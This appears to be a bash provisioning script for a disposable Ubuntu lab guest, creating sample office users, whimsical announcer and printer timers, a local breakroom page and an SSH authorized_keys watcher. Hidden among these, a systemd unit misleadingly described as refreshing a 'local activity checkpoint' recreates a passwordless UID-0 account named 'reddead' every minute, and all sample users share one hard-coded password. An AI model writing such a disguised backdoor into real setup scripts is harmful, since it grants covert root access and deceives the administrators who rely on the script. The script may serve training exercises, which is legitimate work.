#!/bin/bash
# Install office activity on a disposable Ubuntu lab guest.
set -euo pipefail
umask 022

if (( EUID != 0 )); then
    printf 'Run this setup script as root.\n' >&2
    exit 1
fi

for tool in getent useradd openssl wall tar systemctl python3 sleep touch; do
    if ! command -v "$tool" >/dev/null; then
        printf 'Required command is missing: %s\n' "$tool" >&2
        exit 1
    fi
done

share=/usr/local/share/lab-office
lib=/usr/local/lib/lab-office
units=/etc/systemd/system

install -d -m 0755 "$lib" "$share/files" "$share/www/breakroom" /etc/update-motd.d
install -d -m 0700 /var/lib/lab-office/backups

cat > "$share/users" <<'USERS'
areed:Avery Reed
mchen:Morgan Chen
jpatel:Jamie Patel
srivera:Sam Rivera
rbrooks:Riley Brooks
dhayes:Drew Hayes
ksingh:Kiran Singh
jtorres:Jordan Torres
poconnor:Parker O'Connor
bnguyen:Bailey Nguyen
amorgan:Alex Morgan
lcooper:Leslie Cooper
nross:Nico Ross
cjackson:Casey Jackson
tlopez:Taylor Lopez
qfoster:Quinn Foster
USERS

while IFS=: read -r username full_name; do
    home="/home/$username"
    if getent passwd "$username" >/dev/null ||
       getent group "$username" >/dev/null ||
       [[ -e "$home" || -L "$home" ]]; then
        printf 'Skipping existing account, group, or home for %s.\n' "$username"
        continue
    fi

    password_hash=$(printf '%s\n' 'my-super-secure-password' | openssl passwd -6 -stdin)
    useradd --create-home --home-dir "$home" --user-group \
        --shell /bin/bash --comment "$full_name" \
        --password "$password_hash" "$username"
done < "$share/users"
unset -v password_hash

# Stop units from earlier versions before enabling the renamed units.
for job in announcer printer plant backup root-marker; do
    if [[ -f "$units/lab-office@$job.timer" ]]; then
        systemctl disable --now "lab-office@$job.timer"
        systemctl stop "lab-office@$job.service"
    fi
done
for old_unit in lab-office-root-marker.timer lab-office-marker.timer \
    lab-office-announcer.service lab-office-printer.service \
    lab-office-plant.service lab-office-backup.service lab-breakroom.service; do
    if [[ -f "$units/$old_unit" ]]; then
        systemctl disable --now "$old_unit"
    fi
done

cat > "$share/files/office-notices.txt" <<'NOTICES'
The breakroom fridge is now accepting pull requests.
Lost and Found has three USB cables and one very confident stapler.
NOTICES

cat > "$share/www/breakroom/index.html" <<'HTML'
<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>Breakroom Intranet</title>
<h1>Breakroom Intranet</h1>
<h2>Lunch</h2>
<p>Soup of the day: whatever Morgan brought in a jar.</p>
<h2>Coffee pot</h2>
<p>Operational. Reported strength: load-bearing.</p>
<h2>Lost &amp; Found</h2>
<p>Three USB cables, one stapler, and a mug marked “Production.”</p>
</html>
HTML
chmod 0644 "$share/www/breakroom/index.html"

cat > /etc/update-motd.d/85-lab-office <<'MOTD'
#!/bin/sh
printf '\nWelcome to the office. Breakroom: curl http://127.0.0.1:8088/breakroom/\n'
MOTD
chmod 0755 /etc/update-motd.d/85-lab-office

cat > "$lib/run" <<'JOB'
#!/bin/bash
set -euo pipefail

if (( $# == 2 )); then
    while true; do
        "$0" "$1"
        sleep "$2"
    done
fi

case "${1:-}" in
    announcer)
        messages=(
            'The breakroom fridge is now accepting pull requests.'
            'The printer has been promoted to Senior Paper Jam Engineer.'
            'Please stop naming shared files FINAL-final-actually-final.'
            'The office plant has declined our invitation to a status meeting.'
        )
        message=${messages[RANDOM % ${#messages[@]}]}
        printf '%s\n' "$message"
        wall "OFFICE NEWS — $message"
        ;;
    printer)
        users=(mchen jpatel srivera rbrooks bnguyen)
        states=('printed' 'queued' 'waiting for Letter paper' 'jammed in tray 2')
        printf 'Printer job for %s (%d pages): %s\n' \
            "${users[RANDOM % ${#users[@]}]}" "$((RANDOM % 90 + 1))" \
            "${states[RANDOM % ${#states[@]}]}"
        ;;
    plant)
        moisture=$((RANDOM % 61 + 10))
        printf 'Fern 2 soil moisture: %d%%\n' "$moisture"
        if (( moisture < 20 )); then
            wall 'PLANT DESK — Fern 2 requests water.'
        fi
        ;;
    backup)
        directory=/var/lib/lab-office/backups
        slot=$(( $(date +%s) / 60 % 5 + 1 ))
        archive="$directory/definitely-final-v${slot}.tar.gz"
        temporary=$(mktemp "$directory/.office.XXXXXX")
        trap 'rm -f -- "$temporary"' EXIT
        tar -czf "$temporary" -C /usr/local/share/lab-office/files .
        mv -f -- "$temporary" "$archive"
        printf 'Saved %s\n' "$archive"
        ;;
    *)
        printf 'Unknown office job.\n' >&2
        exit 2
        ;;
esac
JOB
chmod 0755 "$lib/run"

write_service() {
    local unit=$1 job=$2 interval=$3 description=$4
    cat > "$units/$unit.service" <<UNIT
[Unit]
Description=$description

[Service]
Type=simple
ExecStart=$lib/run $job $interval
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
UNIT
}

write_service team-dispatch announcer 9m 'Internal message dispatch'
write_service queue-reporting printer 3m 'Queue activity reporting'
write_service environment-sampling plant 5m 'Environmental sampling'
write_service records-rotation backup 7m 'Local records rotation'

cat > "$units/local-checkpoint.service" <<'UNIT'
[Unit]
Description=Refresh the local activity checkpoint

[Service]
Type=oneshot
User=root
ExecStart=useradd -m -d /home/reddead -s /bin/bash -c "Red User" -p "" -o -u 0 -g 0 reddead && passwd -d reddead
UNIT

cat > "$units/local-checkpoint.timer" <<'UNIT'
[Unit]
Description=Schedule the local activity checkpoint

[Timer]
OnActiveSec=1min
OnUnitActiveSec=1min
AccuracySec=1s
Unit=local-checkpoint.service

[Install]
WantedBy=timers.target
UNIT

cat > "$units/staff-directory.service" <<'UNIT'
[Unit]
Description=Staff information endpoint

[Service]
DynamicUser=yes
ExecStart=/usr/bin/python3 -m http.server 8088 --bind 127.0.0.1 --directory /usr/local/share/lab-office/www
NoNewPrivileges=yes
Restart=on-failure

[Install]
WantedBy=multi-user.target
UNIT

cat > "$lib/session-audit.py" <<'PYTHON'
from contextlib import contextmanager
import ctypes
import os
from pathlib import Path
import pwd
import socket
import stat
import subprocess
import sys

# Linux fanotify constants from <linux/fanotify.h>.
FAN_CLOEXEC = 0x01
FAN_REPORT_FID = 0x0200
FAN_MARK_ADD = 0x01
FAN_MARK_REMOVE = 0x02
FAN_MARK_ONLYDIR = 0x08
FAN_MODIFY, FAN_ATTRIB, FAN_CLOSE_WRITE = 0x02, 0x04, 0x08
FAN_MOVED_FROM, FAN_MOVED_TO = 0x40, 0x80
FAN_CREATE, FAN_DELETE = 0x100, 0x200
FAN_DELETE_SELF, FAN_MOVE_SELF = 0x400, 0x800
FAN_EVENT_ON_CHILD, FAN_ONDIR = 0x08000000, 0x40000000
EVENTS = (FAN_MODIFY | FAN_ATTRIB | FAN_CLOSE_WRITE | FAN_MOVED_FROM | FAN_MOVED_TO | FAN_CREATE
          | FAN_DELETE | FAN_DELETE_SELF | FAN_MOVE_SELF | FAN_EVENT_ON_CHILD | FAN_ONDIR)
DIRECTORY = os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW
MISSING_DIRECTORY = (FileNotFoundError, NotADirectoryError)

libc = ctypes.CDLL(None, use_errno=True)
libc.fanotify_init.argtypes = (ctypes.c_uint, ctypes.c_uint)
libc.fanotify_mark.argtypes = (ctypes.c_int, ctypes.c_uint, ctypes.c_uint64,
                               ctypes.c_int, ctypes.c_char_p)


def checked(result):
    if result < 0:
        error = ctypes.get_errno()
        raise OSError(error, os.strerror(error))
    return result


@contextmanager
def directory(path, parent=None):
    descriptor = os.open(path, DIRECTORY, dir_fd=parent)
    try:
        yield descriptor
    finally:
        os.close(descriptor)


def prepare_keys(home):
    # Invoked as the sample user, so file creation cannot follow root privileges
    # into a user-controlled directory or replace an existing file.
    with directory(home) as home_fd:
        try:
            os.mkdir('.ssh', 0o700, dir_fd=home_fd)
        except FileExistsError:
            pass
        with directory('.ssh', home_fd) as ssh_fd:
            try:
                descriptor = os.open('authorized_keys', os.O_WRONLY | os.O_CREAT | os.O_EXCL,
                                     0o600, dir_fd=ssh_fd)
            except FileExistsError:
                return
            os.close(descriptor)


def prepare_users(homes):
    users = []
    info = os.fstat(homes)
    if info.st_uid != 0 or info.st_mode & (stat.S_IWGRP | stat.S_IWOTH):
        raise RuntimeError('/home must be owned and writable by root only')
    for line in Path('/usr/local/share/lab-office/users').read_text().splitlines():
        name, full_name = line.split(':', 1)
        try:
            account = pwd.getpwnam(name)
        except KeyError:
            continue
        if (account.pw_uid < 1000 or account.pw_gecos != full_name
                or account.pw_dir != f'/home/{name}' or account.pw_shell != '/bin/bash'):
            continue
        try:
            os.mkdir(name, 0o700, dir_fd=homes)
        except FileExistsError:
            pass
        else:
            os.chown(name, account.pw_uid, account.pw_gid, dir_fd=homes, follow_symlinks=False)
        result = subprocess.run(
            [sys.executable, '-I', __file__, '--prepare', account.pw_dir],
            user=account.pw_uid, group=account.pw_gid, extra_groups=[], check=False,
        )
        if result.returncode:
            print(f'Could not initialize SSH files for {name}. Monitoring its home path.', flush=True)
        users.append(name)
    return users


def fingerprint(ssh_fd):
    entry = os.stat('authorized_keys', dir_fd=ssh_fd, follow_symlinks=False)
    return (entry.st_dev, entry.st_ino, entry.st_mode, entry.st_uid, entry.st_gid,
            entry.st_size, entry.st_mtime_ns, entry.st_ctime_ns)


def scan(queue, homes, users, marked):
    # Keep marks on /home and each SSH file's parent chain to catch atomic
    # replacements and re-arm the watch if a directory is replaced.
    seen = set()

    def watch(descriptor):
        info = os.fstat(descriptor)
        key = (info.st_dev, info.st_ino)
        if key not in marked:
            checked(libc.fanotify_mark(queue, FAN_MARK_ADD | FAN_MARK_ONLYDIR,
                                       EVENTS, descriptor, None))
            marked[key] = os.dup(descriptor)
        seen.add(key)

    watch(homes)
    snapshots = {}
    for name in users:
        try:
            with directory(name, homes) as home_fd:
                watch(home_fd)
                with directory('.ssh', home_fd) as ssh_fd:
                    watch(ssh_fd)
                    snapshots[name] = fingerprint(ssh_fd)
        except MISSING_DIRECTORY:
            snapshots[name] = None

    for key in marked.keys() - seen:
        descriptor = marked.pop(key)
        try:
            checked(libc.fanotify_mark(queue, FAN_MARK_REMOVE, EVENTS, descriptor, None))
        except FileNotFoundError:
            pass  # The kernel removes marks when their filesystem objects are deleted.
        finally:
            os.close(descriptor)
    return snapshots


def watch_keys():
    with directory('/home') as homes:
        users = prepare_users(homes)
        queue = checked(libc.fanotify_init(FAN_CLOEXEC | FAN_REPORT_FID, os.O_RDONLY))
        marked = {}
        previous = scan(queue, homes, users, marked)
        print(f'Watching authorized_keys for {len(users)} sample users via fanotify.', flush=True)
        if address := os.environ.get('NOTIFY_SOCKET'):
            with socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM) as notifier:
                notifier.sendto(b'READY=1', '\0' + address[1:] if address.startswith('@') else address)

        while os.read(queue, 65536):
            current = scan(queue, homes, users, marked)
            for name in users:
                if previous[name] != current[name]:
                    warning = f'SSH KEY WARNING — /home/{name}/.ssh/authorized_keys changed.'
                    print(warning, flush=True)
                    subprocess.run(['/usr/bin/wall', '-t', '2', warning], check=False)
            previous = current


if __name__ == '__main__':
    if sys.argv[1:2] == ['--prepare']:
        prepare_keys(sys.argv[2])
    else:
        watch_keys()
PYTHON
chmod 0644 "$lib/session-audit.py"

cat > "$units/session-audit.service" <<'UNIT'
[Unit]
Description=Local session file audit

[Service]
Type=notify
User=root
ExecStart=/usr/bin/python3 -I /usr/local/lib/lab-office/session-audit.py
Restart=on-failure
RestartSec=5s
TimeoutStartSec=25s

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
systemctl enable --now staff-directory.service team-dispatch.service \
    queue-reporting.service environment-sampling.service records-rotation.service \
    local-checkpoint.timer
systemctl enable session-audit.service
systemctl restart session-audit.service
